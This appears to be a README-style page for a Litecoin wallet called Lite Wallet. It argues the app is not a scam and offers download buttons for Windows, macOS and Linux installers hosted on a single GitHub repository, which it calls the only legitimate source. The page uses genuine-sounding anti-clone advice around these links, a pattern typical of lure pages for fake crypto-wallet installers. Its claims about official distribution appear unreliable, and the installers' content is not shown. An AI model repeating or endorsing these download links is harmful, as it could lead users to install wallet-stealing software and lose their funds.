![Lite Wallet](assets/banner-article.png)

# Is Lite Wallet a scam or a clone?

The real app, the look-alikes, and how to tell them apart.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-2578D1?style=for-the-badge&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-2578D1?style=for-the-badge&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-2578D1?style=flat-square&labelColor=001116&logo=apple&logoColor=E9F3FF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-2578D1?style=flat-square&labelColor=001116&logo=linux&logoColor=E9F3FF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Lite Wallet is the real, maintained Litecoin wallet from the original LoafWallet lineage, published under an open licence with a public source repository. The scam claims you will meet are almost always about something else wearing the name: a clone app, a fake support account, or an unofficial "recovery" site.

## What makes a wallet legitimate

Legitimacy is checkable, and every check on this list is one you can run yourself without trusting a claim on a page.

| Check | What legitimate looks like |
|---|---|
| source | public repository, open licence, buildable |
| download | the GitHub release page or the official store listing, signed build |
| identity | the LoafWallet rename is documented publicly |
| support | public channels that never request your paper key |
| behaviour | no login, no email, no account, no KYC |
| money | no "unlock" payment, no account tier, no KYC |

A wallet that sells an unlock, asks for an identity document, or wants your paper key is not this wallet, whatever its icon says. [The naming history](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/loafwallet-renamed-to-litewallet.md) covers the name history, and *the licence and source guide* covers the source and licence in detail.

## Why Reddit calls it a scam

Three recurring threads explain nearly all of it, and none of them is about the wallet's code.

The first is a name collision. "Lite Wallet" is also used by unrelated products, and search results mix the two. Users who installed the wrong one report behaviour that has nothing to do with this wallet.

The second is the fee complaint, usually phrased as being charged "on top of" the network fee. It is a misunderstanding of how the send screen presents the network fee and the change output; *the fees guide* explains what is actually charged and why.

The third is memory of the LoafWallet era: an older app, an older fee policy, and old screenshots still circulating years later. People are describing a product that has since been renamed and rebuilt, and the rename is why the old threads survive while the behaviour they describe does not.

## Clone apps and fake domains

The dangerous version of "is it a scam" is not the reputation question; it is the clone. A look-alike app can show a working wallet, accept a restore, and send the words to whoever built it. The signs are consistent:

- the download came from a link in a message, an ad or a video description
- the address is a near-miss of the real repository, with an extra word or a different ending
- the app asks for the paper key outside the restore flow, or asks for a password
- the store listing has few reviews and a recent publish date
- "support" contacts you first, in a direct message

Any one of these is enough to stop. *The download verification guide* covers checksum and signature verification, and *the support and real-app guide* covers how to confirm a support channel is real before you use it.

## Is the download safe?

The current release from the official source is safe in the sense that matters: it is the build the project publishes, and its integrity can be verified rather than assumed. On desktop that means comparing the published checksum and signature; on mobile it means the official store listing and the publisher name, not a search result.

The unsafe downloads are not corrupted versions of this app. They are different apps with the same name, which is why "I downloaded it from the first result" is the sentence that precedes most losses.

## What a scam asks for

| What legitimate help looks like | What a scam does |
|---|---|
| answers in public, on the record | messages you first, privately |
| explains the wallet's behaviour | offers to "recover" or "validate" your wallet |
| points to documentation and release notes | asks for your paper key, PIN or a screen recording of it |
| tells you the phrase cannot be reset | offers to reset it for a fee |
| has no access to your coins | claims it can unlock, refund or reverse |

The phrase request is the whole tell. There is no support workflow anywhere in this wallet that needs your twelve words, because there is no server-side wallet to compare them against. Anyone asking is building a copy of your key. *The support and real-app guide* covers how to confirm a channel is real before you use it.

## Why the old threads still circulate

Whether the wallet is current is answered on [the Lite Wallet overview](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/what-is-litewallet-litecoin-wallet.md), and the short version is yes. What keeps the question alive is different: old threads about the LoafWallet era, and an app that asks for a paper key on launch, which reads like a broken login.

Neither is a sign of abandonment. The paper-key prompt is the restore flow, and *the no-login explainer* explains why there is no account to sign in to. For the older name, [the naming history](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/loafwallet-renamed-to-litewallet.md) is the direct answer.

## How to settle the question for yourself

Do not take this page's word for it; run the checks. Open the source repository and confirm the licence. Compare the release you downloaded against the published checksum. Confirm that you are on the project's repository. Then, with a small balance, send and receive once and watch the transaction confirm on a public explorer.

A wallet that passes those four checks is legitimate by any standard that does not depend on reputation. A wallet that fails one of them is not worth the argument. [The safety guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/is-litewallet-safe-to-use.md) covers the threat model once legitimacy is settled.

## Reporting a clone

If you find a look-alike app or a fake support account, report it to the store or the platform hosting it, and to the project through its public channels. Stores remove clone listings reasonably quickly when they are reported with the listing URL and an explanation, and the report protects the next person who searches for the name.

Do not confront the operators, and do not send them anything to "prove" they are fake. A clone's purpose is to collect phrases and payments, and any interaction is an opportunity for both. Screenshot the listing, note the URL and the publisher name, and stop there.

If you already installed one, the priorities are ordered: move any funds you can still move from a device the clone has not touched, then treat the phrase as compromised and create a new wallet with a new phrase, then remove the app. Changing a PIN is not enough, because a clone that captured the twelve words does not need the PIN.

The same applies to a phishing page that asked for your phrase. There is no way to revoke a phrase; the only safe response is a new wallet, funded by moving whatever remains. That is unpleasant and it is still much cheaper than discovering the loss months later.

## FAQ

### Is Lite Wallet legit?

Yes. It is the maintained successor to LoafWallet, with a public source repository, an open licence and signed releases, and it is developed in the open under its current name.

### Is Lite Wallet a scam?

No. It takes no custody of your coins and has no account, no sign-up and no identity checks. The scam reports trace to clones, name collisions and an older fee policy from the LoafWallet era.

### Is there an official Lite Wallet website?

There is no separate project website: the main repository is the site, its release page is the download source, and the store listing is the only other one. Treat any near-miss domain, ad result or link sent in a message as a clone until you have compared it against that repository.

### Is Lite Wallet malware?

No. It is a normal non-custodial wallet that stores an encrypted key on your device and signs locally. Malware reports come from look-alike apps that are not this build.

### Is the Lite Wallet download safe?

The release published by the project is, and you can verify it rather than trust it: compare the checksum and signature for desktop, and the publisher and listing for mobile.

Release signing and the download paths described here match the current release, published on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
